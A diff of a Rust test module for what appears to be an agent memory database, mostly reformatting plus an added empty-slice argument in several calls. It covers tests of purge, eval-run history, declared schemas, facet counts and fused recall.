@@ -43267,10 +44992,20 @@ pub(crate) mod tests {
     #[test]
     fn purge_residue_partition_counts_journal_as_declared_controlled() {
         let (db, _path) = temp_db();
-        db.remember(&make_entity("e-rs4", "insight", "residue-rs4", r#"{"v":1}"#))
-            .unwrap();
-        db.remember(&make_entity("e-rs5", "insight", "residue-rs5", r#"{"v":2}"#))
-            .unwrap();
+        db.remember(&make_entity(
+            "e-rs4",
+            "insight",
+            "residue-rs4",
+            r#"{"v":1}"#,
+        ))
+        .unwrap();
+        db.remember(&make_entity(
+            "e-rs5",
+            "insight",
+            "residue-rs5",
+            r#"{"v":2}"#,
+        ))
+        .unwrap();
         db.forget("insight", "residue-rs4", "test").unwrap();
         db.forget("insight", "residue-rs5", "test").unwrap();
         let report = db.purge(false).unwrap();
@@ -43302,7 +45037,10 @@ pub(crate) mod tests {
             .iter()
             .filter(|t| t["residue_model"].is_object())
             .collect();
-        assert!(!traces.is_empty(), "corpus must carry deletion-residue traces");
+        assert!(
+            !traces.is_empty(),
+            "corpus must carry deletion-residue traces"
+        );
         for trace in traces {
             let trace_id = trace["trace_id"].as_str().unwrap();
             let (db, _path) = temp_db();
@@ -43362,13 +45100,11 @@ pub(crate) mod tests {
                         let expected = trace["expected_decision"].as_str().unwrap();
                         match db.purge(false) {
                             Ok(_) => assert_eq!(
-                                expected,
-                                "accept",
+                                expected, "accept",
                                 "{trace_id}: purge accepted but corpus expects {expected}"
                             ),
                             Err(e) => assert_eq!(
-                                expected,
-                                "reject",
+                                expected, "reject",
                                 "{trace_id}: purge refused ({e}) but corpus expects {expected}"
                             ),
                         }
@@ -44270,6 +46006,7 @@ pub(crate) mod tests {
                 "write-1",
                 &"a".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap();
         let err = db
@@ -44910,6 +46647,7 @@ pub(crate) mod tests {
                 "push-x",
                 &"a".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap();
         db.action_complete(&action.id, "agent-lm", "executed", &artifact_sha)
@@ -44945,6 +46683,7 @@ pub(crate) mod tests {
                 "distill-y",
                 &"b".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap();
         db.action_complete(&action.id, "agent-lm", "executed", &"c".repeat(64))
@@ -44977,6 +46716,7 @@ pub(crate) mod tests {
                 "distill-z",
                 &"d".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap();
         db.action_complete(&action.id, "agent-lm", "executed", &artifact_sha)
@@ -45012,6 +46752,7 @@ pub(crate) mod tests {
                 "distill-w",
                 &"e".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap();
         db.action_complete(&action.id, "agent-lm", "executed", &artifact_sha)
@@ -45063,6 +46804,7 @@ pub(crate) mod tests {
                 "distill-flow",
                 &"f".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap();
         db.action_complete(&action.id, "agent-lm", "executed", &artifact_sha)
@@ -45147,6 +46889,7 @@ pub(crate) mod tests {
                 "distill-p",
                 &"c".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap();
         db.action_complete(&action.id, "agent-lm", "executed", &artifact_sha)
@@ -45239,6 +46982,7 @@ pub(crate) mod tests {
                 "distill-s",
                 &"d".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap();
         db.action_complete(&action.id, "agent-lm", "executed", &artifact_sha)
@@ -47258,7 +49002,9 @@ pub(crate) mod tests {
         assert_eq!(all[1].id, b.id);
         assert_eq!(all[2].id, a.id);
         // kind filter
-        let nightly = db.eval_run_history(Some("nightly"), 10, false).expect("kind");
+        let nightly = db
+            .eval_run_history(Some("nightly"), 10, false)
+            .expect("kind");
         assert_eq!(nightly.len(), 1);
         assert_eq!(nightly[0].id, a.id);
         // limit
@@ -47282,16 +49028,12 @@ pub(crate) mod tests {
         );
         let breaches: Vec<crate::eval_regression::Breach> =
             serde_json::from_str(&bad.breaches_json).expect("breaches decode");
-        assert!(
-            breaches
-                .iter()
-                .any(|b| b.threshold_type == "floor" && b.metric == "validity_rate")
-        );
-        assert!(
-            breaches
-                .iter()
-                .any(|b| b.threshold_type == "regression" && b.metric == "validity_rate")
-        );
+        assert!(breaches
+            .iter()
+            .any(|b| b.threshold_type == "floor" && b.metric == "validity_rate"));
+        assert!(breaches
+            .iter()
+            .any(|b| b.threshold_type == "regression" && b.metric == "validity_rate"));
         // different kind: no baseline -> floor check only, still regressed
         let manual = db
             .eval_run_record(&eval_input("manual", 3000, 0.80, 0.0))
@@ -47313,10 +49055,9 @@ pub(crate) mod tests {
         assert!(bad.regressed);
         let breaches: Vec<crate::eval_regression::Breach> =
             serde_json::from_str(&bad.breaches_json).expect("decode");
-        assert!(
-            breaches.iter().any(|b| b.metric == "scope_invalid_recall_rate"
-                && b.direction == "lower_better")
-        );
+        assert!(breaches
+            .iter()
+            .any(|b| b.metric == "scope_invalid_recall_rate" && b.direction == "lower_better"));
     }
 
     #[test]
@@ -47357,7 +49098,10 @@ pub(crate) mod tests {
         assert!(db.eval_run_record(&input).is_err(), "unknown kind rejected");
         input.eval_kind = "nightly";
         input.status = "pending";
-        assert!(db.eval_run_record(&input).is_err(), "unknown status rejected");
+        assert!(
+            db.eval_run_record(&input).is_err(),
+            "unknown status rejected"
+        );
         input.status = "passed";
         input.accuracy = 1.5;
         assert!(db.eval_run_record(&input).is_err(), "accuracy out of range");
@@ -49228,8 +50972,14 @@ pub(crate) mod tests {
         // gate would quarantine near-duplicates). Bodies themselves are
         // kept textually distinct so the gate's token-containment stays
         // well under the default 0.9 bound.
-        db.remember_with_options(&make_entity(key, category, key, &body.to_string()), true, None, None, false)
-            .unwrap();
+        db.remember_with_options(
+            &make_entity(key, category, key, &body.to_string()),
+            true,
+            None,
+            None,
+            false,
+        )
+        .unwrap();
     }
 
     #[test]
@@ -49238,9 +50988,7 @@ pub(crate) mod tests {
         let base = vec![declared_field("x", "scalar", false)];
 
         // Reserved category cannot be declared.
-        assert!(
-            crate::declared::declared_schema_set(&db, "declared_schema", &base, "").is_err()
-        );
+        assert!(crate::declared::declared_schema_set(&db, "declared_schema", &base, "").is_err());
         // Duplicate field names.
         let dup = vec![
             declared_field("a", "scalar", false),
@@ -49251,7 +50999,14 @@ pub(crate) mod tests {
         let empty = vec![declared_field("", "scalar", false)];
         assert!(crate::declared::declared_schema_set(&db, "cat", &empty, "").is_err());
         // Vault-reserved field names.
-        for reserved in ["id", "category", "key", "recall_when", "origin", "external_refs"] {
+        for reserved in [
+            "id",
+            "category",
+            "key",
+            "recall_when",
+            "origin",
+            "external_refs",
+        ] {
             let bad = vec![declared_field(reserved, "scalar", false)];
             assert!(
                 crate::declared::declared_schema_set(&db, "cat", &bad, "").is_err(),
@@ -49269,9 +51024,7 @@ pub(crate) mod tests {
             .collect();
         assert!(crate::declared::declared_schema_set(&db, "cat", &facets, "").is_err());
         // Guidance cap.
-        assert!(
-            crate::declared::declared_schema_set(&db, "cat", &base, &"x".repeat(501)).is_err()
-        );
+        assert!(crate::declared::declared_schema_set(&db, "cat", &base, &"x".repeat(501)).is_err());
 
         // Valid declaration + idempotent version bump + load round trip.
         let s1 = seed_declared_schema(&db, "cat", base.clone());
@@ -49283,7 +51036,9 @@ pub(crate) mod tests {
             .expect("schema loads");
         assert_eq!(loaded.query_guidance, "guidance");
         assert_eq!(loaded.fields.len(), 1);
-        assert!(crate::declared::load_declared_schema(&db, "absent").unwrap().is_none());
+        assert!(crate::declared::load_declared_schema(&db, "absent")
+            .unwrap()
+            .is_none());
         let _ = std::fs::remove_file(path);
     }
 
@@ -49330,7 +51085,9 @@ pub(crate) mod tests {
         // Exact scalar equality: only gold, deterministic order, no ranking.
         let gold = crate::declared::declared_candidates(
             &db,
-            &crate::declared::load_declared_schema(&db, "deals").unwrap().unwrap(),
+            &crate::declared::load_declared_schema(&db, "deals")
+                .unwrap()
+                .unwrap(),
             &[crate::declared::DeclaredFilter {
                 field: "tier".into(),
                 value: serde_json::json!("gold"),
@@ -49347,7 +51104,9 @@ pub(crate) mod tests {
         // String-list membership (any-of).
         let eu = crate::declared::declared_candidates(
             &db,
-            &crate::declared::load_declared_schema(&db, "deals").unwrap().unwrap(),
+            &crate::declared::load_declared_schema(&db, "deals")
+                .unwrap()
+                .unwrap(),
             &[crate::declared::DeclaredFilter {
                 field: "tags".into(),
                 value: serde_json::json!(["eu"]),
@@ -49363,7 +51122,9 @@ pub(crate) mod tests {
         // AND semantics.
         let anded = crate::declared::declared_candidates(
             &db,
-            &crate::declared::load_declared_schema(&db, "deals").unwrap().unwrap(),
+            &crate::declared::load_declared_schema(&db, "deals")
+                .unwrap()
+                .unwrap(),
             &[
                 crate::declared::DeclaredFilter {
                     field: "tier".into(),
@@ -49414,11 +51175,8 @@ pub(crate) mod tests {
             "non-facet facet request must be rejected"
         );
         assert!(
-            crate::tools::handle_declared_query(
-                &db,
-                serde_json::json!({"category": "undeclared"})
-            )
-            .is_err(),
+            crate::tools::handle_declared_query(&db, serde_json::json!({"category": "undeclared"}))
+                .is_err(),
             "undeclared category must be rejected"
         );
         let _ = std::fs::remove_file(path);
@@ -49454,7 +51212,9 @@ pub(crate) mod tests {
                 serde_json::json!({"tier": "silver", "owner": format!("owner-{i:03}")}),
             );
         }
-        let schema = crate::declared::load_declared_schema(&db, "facets").unwrap().unwrap();
+        let schema = crate::declared::load_declared_schema(&db, "facets")
+            .unwrap()
+            .unwrap();
         let counts = crate::declared::facet_counts(
             &db,
             &schema,
@@ -49475,13 +51235,20 @@ pub(crate) mod tests {
             "55 distinct owners, 50 shown, 5 rolled into other"
         );
         assert_eq!(
-            owner.iter().filter(|f| f.value != "other").map(|f| f.count).sum::<i64>(),
+            owner
+                .iter()
+                .filter(|f| f.value != "other")
+                .map(|f| f.count)
+                .sum::<i64>(),
             50
         );
         // Silver rows never inflate gold counts: owner-000 appears exactly
         // once (the gold f-00 row), not twice (s-0's silver row excluded).
         assert_eq!(
-            owner.iter().find(|f| f.value == "owner-000").map(|f| f.count),
+            owner
+                .iter()
+                .find(|f| f.value == "owner-000")
+                .map(|f| f.count),
             Some(1)
         );
         let _ = std::fs::remove_file(path);
@@ -49512,12 +51279,9 @@ pub(crate) mod tests {
         let mut params = fused_params("airship exploration program");
         params.declared_category = Some("declared_cat".into());
         params.declared_filters = Some(
-            [(
-                "tier".to_string(),
-                serde_json::json!("silver"),
-            )]
-            .into_iter()
-            .collect(),
+            [("tier".to_string(), serde_json::json!("silver"))]
+                .into_iter()
+                .collect(),
         );
         let (entities, _c, trace) = db.fused_recall(&params).unwrap();
         assert_eq!(
@@ -49525,13 +51289,23 @@ pub(crate) mod tests {
             Some("d2"),
             "exact match pinned ahead of the fused pool"
         );
-        assert!(entities.iter().any(|e| e.id == "d1"), "fuzzy fallback still serves");
         assert!(
-            trace.strategies.iter().any(|s| s.strategy == "declared" && s.candidates == 1),
+            entities.iter().any(|e| e.id == "d1"),
+            "fuzzy fallback still serves"
+        );
+        assert!(
+            trace
+                .strategies
+                .iter()
+                .any(|s| s.strategy == "declared" && s.candidates == 1),
             "declared strategy trace present"
         );
         assert!(
-            trace.sources.get("d2").map(|s| s.contains(&"declared".to_string())).unwrap_or(false),
+            trace
+                .sources
+                .get("d2")
+                .map(|s| s.contains(&"declared".to_string()))
+                .unwrap_or(false),
             "declared consensus source recorded"
         );
         assert_eq!(trace.fusion.weights.get("declared"), Some(&1.0));
@@ -49545,7 +51319,9 @@ pub(crate) mod tests {
         let mut no_strat = fused_params("anything");
         no_strat.strategies = vec!["fts5".into()];
         no_strat.declared_filters = Some(
-            [("tier".to_string(), serde_json::json!("gold"))].into_iter().collect(),
+            [("tier".to_string(), serde_json::json!("gold"))]
+                .into_iter()
+                .collect(),
         );
         assert!(db.fused_recall(&no_strat).is_err());
 
@@ -49554,7 +51330,9 @@ pub(crate) mod tests {
         mismatch.category = Some("other".into());
         mismatch.declared_category = Some("declared_cat".into());
         mismatch.declared_filters = Some(
-            [("tier".to_string(), serde_json::json!("gold"))].into_iter().collect(),
+            [("tier".to_string(), serde_json::json!("gold"))]
+                .into_iter()
+                .collect(),
         );
         assert!(db.fused_recall(&mismatch).is_err());
 
@@ -49562,7 +51340,9 @@ pub(crate) mod tests {
         let mut undeclared = fused_params("anything");
         undeclared.declared_category = Some("nope".into());
         undeclared.declared_filters = Some(
-            [("tier".to_string(), serde_json::json!("gold"))].into_iter().collect(),
+            [("tier".to_string(), serde_json::json!("gold"))]
+                .into_iter()
+                .collect(),
         );
         assert!(db.fused_recall(&undeclared).is_err());
 
@@ -49570,7 +51350,9 @@ pub(crate) mod tests {
         let mut unknown = fused_params("anything");
         unknown.declared_category = Some("declared_cat".into());
         unknown.declared_filters = Some(
-            [("owner".to_string(), serde_json::json!("x"))].into_iter().collect(),
+            [("owner".to_string(), serde_json::json!("x"))]
+                .into_iter()
+                .collect(),
         );
         assert!(db.fused_recall(&unknown).is_err());
 
